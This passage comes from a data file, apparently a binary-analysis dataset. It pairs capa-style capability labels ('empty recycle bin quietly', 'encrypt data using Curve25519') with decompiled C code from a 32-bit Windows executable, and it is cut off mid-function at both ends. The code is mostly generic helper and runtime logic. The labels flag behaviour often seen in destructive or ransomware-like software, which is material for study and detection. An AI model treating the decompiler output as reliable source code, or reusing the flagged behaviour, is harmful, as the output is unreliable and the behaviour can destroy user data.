}\n    if (iVar3 < 7) {\n        if (*(iVar3 + iVar1) != *(iVar3 + iVar5)) {\n            return 0;\n        }\n        iVar3 = iVar3 + 2;\n    }\n    if ((iVar3 < 8) && (*(in_EAX + param_1 + -1) != *(param_2 + param_1 + -1))) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 607
    },
    "0042c1d0": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h_2\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.0042c1d0(int32_t *noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6\n            , uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, \n            uint noname_13, uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, \n            uint noname_19, uint arg_ch)\n\n{\n    uint8_t uVar1;\n    int32_t arg_ch_00;\n    uint32_t uVar2;\n    uint extraout_ECX;\n    uint8_t *puVar3;\n    int32_t unaff_ESI;\n    uint *in_FS_OFFSET;\n    int32_t var_ch;\n    uint8_t *var_4h;\n    int32_t var_4h_2;\n    int32_t var_8h_2;\n    uint var_10h_5;\n    uint var_10h_3;\n    uint var_18h;\n    uint var_1ch_2;\n    uint var_1ch;\n    uint var_10h;\n    uint var_8h;\n    uchar auStack180 [4];\n    int32_t iStack176;\n    uchar *puStack172;\n    int32_t iStack168;\n    uchar *puStack164;\n    uint arg_ch_01;\n    uint arg_10h;\n    uint uStack144;\n    uint uStack140;\n    uchar *puStack136;\n    int32_t iStack132;\n    uint8_t *puStack128;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    uint *puStack108;\n    uint uStack104;\n    int32_t *piStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint32_t uStack84;\n    uchar *puStack80;\n    uint32_t uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uchar auStack52 [12];\n    uint var_30h_2;\n    uint var_30h;\n    uint uStack24;\n    uchar *puStack20;\n    uchar *puStack16;\n    uint32_t uStack12;\n    uint32_t var_10h_4;\n    uint var_10h_2;\n    \n    puStack108 = &fcn.0042c1d0::var_10h_2;\n    uStack12 = var_4h[1];\n    if (uStack12 != 0) {\n        puVar3 = var_4h + 3;\n        uVar2 = uStack12;\n        do {\n            uVar1 = *puVar3;\n            if ((uVar1 & 0x80) == 0) {\n                if (uVar1 == 0xc) {\n                    var_8h_2 = var_8h_2 + 0x10;\n                }\n                else {\n                    if ((uVar1 < 5) || (7 < uVar1)) goto code_r0x0042c227;\n                    var_8h_2 = var_8h_2 + 8;\n                }\n            }\n            else {\ncode_r0x0042c227:\n                var_8h_2 = var_8h_2 + 4;\n            }\n            puVar3 = puVar3 + 1;\n            uVar2 = uVar2 - 1;\n            unaff_ESI = var_8h_2;\n        } while (uVar2 != 0);\n    }\n    puStack128 = var_4h;\n    puStack20 = &stack0xffffffc0;\n    var_10h_4 = var_4h[2];\n    iStack132 = unaff_ESI;\n    for (uVar2 = var_10h_4; uVar2 != 0; uVar2 = uVar2 - 1) {\n        iStack132 = var_4h_2;\n    }\n    uStack76 = *var_4h;\n    if ((uStack76 == 4) && ((var_10h_4 = var_10h_4 + 1,  var_4h[3] == 9 || (var_4h[3] == 0xd)))) {\n        uStack76 = 8;\n    }\n    puStack16 = &stack0xffffffc0;\n    uStack68 = 0;\n    puStack72 = &stack0xffffffcc;\n    puStack80 = NULL;\n    uStack84 = 0x42c27b;\n    fcn.0042c1c0();\n    uStack84 = uStack76;\n    uStack76 = var_10h_5;\n    uStack88 = puStack80;\n    uStack92 = 0x490a3c;\n    uStack96 = noname_2;\n    piStack100 = noname_0;\n    uStack104 = 0x42c297;\n    puStack80 = &stack0xffffffec;\n    arg_ch_00 = (**(*noname_0 + 0x18))();\n    if (arg_ch_00 == 0) {\n        return;\n    }\n    puStack172 = &stack0xffffffcc;\n    uStack104 = CONCAT31(extraout_ECX >> 8, 1);\n    puStack136 = &stack0xffffff94;\n    uStack116 = 0;\n    uStack120 = 0;\n    uStack124 = 0;\n    uStack140 = 0x42c1a5;\n    uStack144 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff70;\n    if (arg_ch_00 == -0x7ffdfff7) {\n        puStack136 = &stack0xffffff94;\n        puStack108 = &fcn.0042c1d0::var_10h_2;\n        fcn.004056f4();\n        arg_10h = uStack116;\n        fcn.004056f4();\n        puStack164 = 0x42c138;\n        arg_ch_01 = uStack120;\n        fcn.004056f4();\n        puStack164 = 0x42c147;\n        iStack168 = fcn.0042b478(var_30h, arg_ch_01, arg_10h, uStack24);\n        if (piStack100 != '\\0') {\n            puStack164 = 0x42c15c;\n            fcn.00406104();\n        }\n    }\n    else {\n        arg_10h = 0;\n        iStack168 = fcn.0042b3a4(0, arg_ch_00);\n    }\n    if (var_ch != 0) {\n        iStack176 = iStack168;\n        if (iStack168 == 0) {\n            iStack176 = fcn.00405460();\n        }\n        puStack164 = &stack0xffffffc0;\n    // WARNING: Could not recover jumptable at 0x00404ed5. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**0x493014)(0xeedfade, 1, 7, &stack0xffffff4c);\n        return;\n    }\n    fcn.00404eb4();\n    *in_FS_OFFSET = arg_10h;\n    uStack144 = 0x42c1ac;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 1690
    },
    "0047151c": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nvoid fcn.0047151c(void)\n\n{\n    uint in_EAX;\n    \n    fcn.004054c0();\n    // switch table (8 cases) at 0x47153e\n    switch(in_EAX) {\n    case 1:\n        fcn.004054c0();\n        return;\n    case 2:\n        fcn.004054c0();\n        return;\n    case 3:\n        fcn.004054c0();\n        return;\n    case 4:\n        fcn.004054c0();\n        return;\n    case 5:\n        fcn.004054c0();\n        return;\n    case 6:\n        fcn.004054c0();\n        break;\n    case 7:\n        fcn.004054c0();\n        return;\n    }\n    return;\n}\n",
        "token_count": 176
    },
    "0047e710": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nvoid fcn.0047e710(void)\n\n{\n    uchar in_AL;\n    \n    // switch table (8 cases) at 0x47e728\n    switch(in_AL) {\n    default:\n        *0x49898c = 3;\n        *0x49898d = 4;\n        return;\n    case 1:\n        *0x49898c = in_AL;\n        *0x49898d = 0x20;\n        return;\n    case 2:\n        *0x49898c = in_AL;\n        *0x49898d = 8;\n        return;\n    case 3:\n        *0x49898c = in_AL;\n        *0x49898d = 4;\n        return;\n    case 5:\n        *0x49898c = in_AL;\n        *0x49898d = 2;\n        return;\n    case 7:\n        *0x49898c = in_AL;\n        *0x49898d = 1;\n        return;\n    }\n}\n",
        "token_count": 223
    },
    "0041005c": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041005c(uint arg_8h, int32_t arg_ch, uint noname_2, uint arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x4100b6;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (arg_ch == 0x400) {\n        fcn.004056f4();\n        fcn.00409ea8();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x4100bd;\n    uStack20 = 0x4100b5;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 197
    },
    "004100c8": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004100c8(uint arg_8h, int32_t arg_ch, uint noname_2, uint arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x410122;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (arg_ch == 0x400) {\n        fcn.004056f4();\n        fcn.0040b7a8();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x410129;\n    uStack20 = 0x410121;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 194
    },
    "00410134": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410134(uint arg_8h, int32_t arg_ch, uint noname_2, uint arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x41018e;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (arg_ch == 0x400) {\n        fcn.004056f4();\n        fcn.0040b77c();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x410195;\n    uStack20 = 0x41018d;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 194
    },
    "004101a0": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004101a0(uint arg_8h, int32_t arg_ch, uint noname_2, uint arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x4101fa;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (arg_ch == 0x400) {\n        fcn.004056f4();\n        fcn.0040d1c0();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x410201;\n    uStack20 = 0x4101f9;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 197
    },
    "0041020c": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041020c(uint arg_8h, int32_t arg_ch, uint noname_2, uint arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x410266;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (arg_ch == 0x400) {\n        fcn.004056f4();\n        fcn.0040b7d4();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x41026d;\n    uStack20 = 0x410265;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 195
    },
    "00411f0c": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid fcn.00411f0c(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack28 = 0x411faf;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    fcn.00415110();\n    uVar3 = var_4h;\n    iVar2 = (***0x492aac)(var_4h, 0x400, 0, &var_8h);\n    if (iVar2 == -0x7ffdfffb) {\n        fcn.004056f4();\n        cVar1 = fcn.00409ea8();\n        if (cVar1 == '\\0') {\n            var_8h = fcn.0041316c();\n            var_8h = var_8h & 0x7f;\n        }\n    }\n    else if (iVar2 != 0) {\n        fcn.00411244();\n    }\n    *in_FS_OFFSET = uVar3;\n    fcn.0040546c(0x411fb6);\n    fcn.00405c48();\n    return;\n}\n",
        "token_count": 331
    },
    "00412910": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nuint64_t fcn.00412910(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    uint uStack44;\n    uint uStack40;\n    int32_t iStack36;\n    uchar *puStack32;\n    uchar auStack24 [4];\n    uchar auStack20 [16];\n    \n    puStack32 = &stack0xffffffec;\n    iStack36 = 0x412920;\n    sub.oleaut32.dll_VariantInit();\n    iStack36 = 3;\n    uStack40 = 0;\n    uStack44 = 0x400;\n    iVar1 = (***0x4929e8)(&stack0xffffffe8);\n    if (iVar1 == 0) {\n        uVar3 = iStack36;\n    }\n    else {\n        iVar1 = (***0x4929e8)(&stack0xffffffd4);\n        if (iVar1 == 0) {\n            uVar3 = fcn.00403444();\n        }\n        else if (iVar1 == -0x7ffdfffb) {\n            uVar2 = fcn.0041316c();\n            uVar3 = uVar2 & 0x7f;\n        }\n        else {\n            fcn.00411244();\n            uVar3 = 0;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 303
    },
    "004129bc": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004129bc(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack52 = 0x412aaa;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    fcn.00415110();\n    fcn.004056f4();\n    cVar1 = fcn.00409ec8();\n    if (cVar1 == '\\0') {\n        iVar2 = (***0x492aac)(var_4h, 0x400, 0, &fcn.004129bc::var_14h);\n        if (iVar2 == 0) {\n            _var_10h = var_14h;\n        }\n        else {\n            iVar2 = (***0x4928b8)(var_4h, 0x400, 0, &fcn.004129bc::var_20h);\n            if (iVar2 == 0) {\n                _var_10h = fcn.00403444();\n            }\n            else if (iVar2 == -0x7ffdfffb) {\n                uVar3 = fcn.0041316c();\n                _var_10h = uVar3 & 0x7f;\n            }\n            else {\n                fcn.00411244();\n                _var_10h = 0;\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x412ab1;\n    uStack52 = 0x412aa1;\n    fcn.0040546c();\n    uStack52 = 0x412aa9;\n    fcn.00405c48();\n    return;\n}\n",
        "token_count": 476
    },
    "0041695c": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041695c(float arg_8h, float arg_ch, uint arg_10h)\n\n{\n    uint8_t uVar1;\n    int32_t *in_EAX;\n    uint8_t *puVar2;\n    int32_t in_EDX;\n    double *pdVar3;\n    code *var_8h;\n    uint var_4h;\n    \n    var_8h = *(in_EDX + 8);\n    puVar2 = fcn.00416484();\n    uVar1 = *puVar2;\n    if ((var_8h & 0xff000000) == 0xff000000) {\n        pdVar3 = (var_8h & 0xffffff) + in_EAX;\n    // switch table (5 cases) at 0x4169a5\n        switch(uVar1 & 0x7f) {\n        case 0:\n            *pdVar3 = CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h));\n            break;\n        case 1:\n            *pdVar3 = CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h));\n            break;\n        case 2:\n            *pdVar3 = arg_8h;\n            *(pdVar3 + 4) = arg_ch;\n            *(pdVar3 + 1) = arg_10h;\n            break;\n        case 3:\n            *pdVar3 = ROUND(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h)));\n            break;\n        case 4:\n            *pdVar3 = ROUND(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h)) * *0x416b50);\n        }\n    }\n    else {\n        if ((var_8h & 0xff000000) == 0xfe000000) {\n            var_8h = *(*in_EAX + var_8h);\n        }\n        if (*(in_EDX + 0x10) == -0x80000000) {\n    // switch table (5 cases) at 0x416a41\n            switch(uVar1 & 0x7f) {\n            case 0:\n                (*var_8h)();\n                break;\n            case 1:\n                (*var_8h)(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h)));\n                break;\n            case 2:\n                (*var_8h)(arg_8h, arg_ch, arg_10h);\n                break;\n            case 3:\n                (*var_8h)(ROUND(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h))));\n                break;\n            case 4:\n                (*var_8h)(ROUND(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h)) * *0x416b50));\n            }\n        }\n        else {\n    // switch table (5 cases) at 0x416ad4\n            switch(uVar1 & 0x7f) {\n            case 0:\n                (*var_8h)();\n                break;\n            case 1:\n                (*var_8h)(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h)));\n                break;\n            case 2:\n                (*var_8h)(arg_8h, arg_ch, arg_10h);\n                break;\n            case 3:\n                (*var_8h)(ROUND(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h))));\n                break;\n            case 4:\n                (*var_8h)(ROUND(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h)) * *0x416b50));\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 814
    },
    "0041baa0": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nulong __cdecl fcn.0041baa0(uint arg_8h, uint arg_ch)\n\n{\n    ulong uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.0040a194(arg_8h, arg_ch);\n    return uVar1;\n}\n",
        "token_count": 71
    },
    "0041da14": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041da14(uint param_1)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = fcn.0041ea90(param_1);\n    // switch table (14 cases) at 0x41da4a\n    switch(uVar1 & 0x7f) {\n    case 0:\n        fcn.004054c0();\n        break;\n    default:\n        fcn.0041c938();\n        break;\n    case 7:\n        fcn.0041cf28();\n        fcn.0040555c();\n        fcn.0040595c();\n        fcn.0041cf28();\n        break;\n    case 8:\n        fcn.004054c0();\n        break;\n    case 9:\n        fcn.004054c0();\n        break;\n    case 0xd:\n        fcn.004054c0();\n    }\n    return;\n}\n",
        "token_count": 203
    },
    "0041eba0": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid fcn.0041eba0(void)\n\n{\n    uint32_t uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    var_8h = 0;\n    uStack20 = 0x41ed45;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    uVar1 = fcn.0041ea90();\n    // switch table (22 cases) at 0x41ebd7\n    switch(uVar1 & 0x7f) {\n    case 1:\n        fcn.0041eaec(&stack0xfffffffc);\n        break;\n    case 2:\n        fcn.0041efac();\n        break;\n    case 3:\n        fcn.0041efac();\n        break;\n    case 4:\n        fcn.0041efac();\n        break;\n    case 5:\n        fcn.0041efac();\n        break;\n    case 6:\n    case 7:\n        fcn.0041e8b4();\n        break;\n    case 10:\n        fcn.0041eb14(&stack0xfffffffc);\n        break;\n    case 0xb:\n        fcn.0041eaa4();\n        break;\n    case 0xc:\n        fcn.0041eb14(&stack0xfffffffc);\n        break;\n    case 0xe:\n        fcn.0041eb44(&stack0xfffffffc);\n        break;\n    case 0xf:\n        fcn.0041efac();\n        break;\n    case 0x10:\n        fcn.0041efac();\n        break;\n    case 0x11:\n        fcn.0041efac();\n        break;\n    case 0x12:\n        fcn.0041eb14(&stack0xfffffffc);\n        break;\n    case 0x13:\n        fcn.0041efac();\n        break;\n    case 0x14:\n        fcn.0041eb14(&stack0xfffffffc);\n        break;\n    case 0x15:\n        fcn.0041efac();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x41ed4c;\n    uStack20 = 0x41ed44;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 549
    },
    "0041f1bc": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid fcn.0041f1bc(void)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint *in_FS_OFFSET;\n    ulong uVar3;\n    uint in_stack_ffffffc8;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_1ch;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    uStack44 = 0x41f3ce;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    fcn.004115e8();\n    uVar2 = fcn.0041cf04();\n    // switch table (22 cases) at 0x41f1fe\n    switch(uVar2 & 0x7f) {\n    case 0:\n    case 0xd:\n        cVar1 = fcn.0041ea90();\n        if (cVar1 != '\\r') {\n            fcn.004162d0();\n        }\n        break;\n    default:\n        fcn.0040db2c();\n        fcn.00404eb4();\n        break;\n    case 2:\n        fcn.0041db10();\n        fcn.00415854();\n        break;\n    case 3:\n        fcn.0041db10();\n        fcn.00415854();\n        break;\n    case 4:\n        fcn.0041db10();\n        fcn.00415854();\n        break;\n    case 5:\n        fcn.0041d8c0();\n        fcn.00415a4c();\n        break;\n    case 6:\n    case 0xc:\n        fcn.0041e8f0();\n        fcn.00415a88();\n        break;\n    case 8:\n    case 9:\n        fcn.0041ea90();\n        fcn.00415a24();\n        break;\n    case 10:\n        in_stack_ffffffc8 = 0x41f371;\n        fcn.0041eff4(&stack0xfffffffc);\n        fcn.00411a14();\n        break;\n    case 0xf:\n        fcn.0041d93c();\n        fcn.00415a4c();\n        break;\n    case 0x10:\n        fcn.0041d980();\n        fcn.00415a74();\n        break;\n    case 0x11:\n        fcn.0041d9d0();\n        fcn.00415a60();\n        break;\n    case 0x12:\n    case 0x14:\n        fcn.0041e9ac();\n        fcn.00415ab4();\n        break;\n    case 0x13:\n        uVar3 = fcn.0041db7c();\n        in_stack_ffffffc8 = uVar3;\n        fcn.00415950(in_stack_ffffffc8, uVar3 >> 0x20);\n        break;\n    case 0x15:\n        fcn.0041d8f8();\n        fcn.00415a4c();\n    }\n    *in_FS_OFFSET = in_stack_ffffffc8;\n    uStack48 = 0x41f3d5;\n    fcn.004115fc();\n    fcn.00405c48();\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 752
    },
    "00431774": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid fcn.00431774(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    do {\n        iVar1 = *(in_EAX + 8 + (uVar2 & 0x7f) * 4);\n        if (iVar1 != 0) {\n            (***0x492844)(iVar1);\n            *(in_EAX + 8 + (uVar2 & 0x7f) * 4) = 0;\n        }\n        uVar2 = uVar2 + 1;\n    } while (uVar2 != '\\x18');\n    return;\n}\n",
        "token_count": 152
    },
    "004318b0": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004318b0(uchar *param_1, uint32_t param_2)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    \n    *param_1 = 3;\n    uVar1 = param_2 - 2;\n    if (uVar1 < 7) {\n        *(param_1 + 4) = 1;\n        iVar2 = 2;\n    }\n    else if (uVar1 == 7) {\n        *(param_1 + 4) = 2;\n        iVar2 = 9;\n    }\n    else {\n        *(param_1 + 4) = 0;\n        iVar2 = 0;\n    }\n    *(param_1 + 8) = ((param_2 & 0x7f) - iVar2) + 1;\n    return;\n}\n",
        "token_count": 188
    },
    "004318ec": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004318ec(uchar *param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    *param_1 = 10;\n    // switch table (18 cases) at 0x431917\n    switch(param_2 & 0xff) {\n    default:\n        *(param_1 + 4) = 0;\n        iVar1 = 0;\n        break;\n    case 2:\n        *(param_1 + 4) = 1;\n        iVar1 = 2;\n        break;\n    case 3:\n        *(param_1 + 4) = 2;\n        iVar1 = 3;\n        break;\n    case 4:\n    case 5:\n    case 6:\n    case 7:\n    case 8:\n    case 9:\n        *(param_1 + 4) = 3;\n        iVar1 = 4;\n        break;\n    case 10:\n    case 0xb:\n    case 0xc:\n    case 0xd:\n        *(param_1 + 4) = 4;\n        iVar1 = 10;\n        break;\n    case 0xe:\n    case 0xf:\n    case 0x10:\n    case 0x11:\n        *(param_1 + 4) = 5;\n        iVar1 = 0xe;\n    }\n    *(param_1 + 8) = ((param_2 & 0x7f) - iVar1) + 1;\n    return;\n}\n",
        "token_count": 331
    },
    "00431988": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00431988(uchar *param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    *param_1 = 0x17;\n    // switch table (105 cases) at 0x431a0e\n    switch(param_2 & 0xff) {\n    default:\n        *(param_1 + 4) = 0;\n        iVar1 = 0;\n        break;\n    case 2:\n    case 3:\n    case 4:\n        *(param_1 + 4) = 1;\n        iVar1 = 2;\n        break;\n    case 5:\n    case 6:\n    case 7:\n        *(param_1 + 4) = 2;\n        iVar1 = 5;\n        break;\n    case 8:\n    case 9:\n    case 10:\n        *(param_1 + 4) = 3;\n        iVar1 = 8;\n        break;\n    case 0xb:\n    case 0xc:\n    case 0xd:\n        *(param_1 + 4) = 4;\n        iVar1 = 0xb;\n        break;\n    case 0xe:\n    case 0xf:\n    case 0x10:\n        *(param_1 + 4) = 5;\n        iVar1 = 0xe;\n        break;\n    case 0x11:\n    case 0x12:\n    case 0x13:\n        *(param_1 + 4) = 6;\n        iVar1 = 0x11;\n        break;\n    case 0x14:\n    case 0x15:\n        *(param_1 + 4) = 7;\n        iVar1 = 0x14;\n        break;\n    case 0x16:\n    case 0x17:\n        *(param_1 + 4) = 8;\n        iVar1 = 0x16;\n        break;\n    case 0x18:\n    case 0x19:\n        *(param_1 + 4) = 9;\n        iVar1 = 0x18;\n        break;\n    case 0x1a:\n    case 0x1b:\n        *(param_1 + 4) = 10;\n        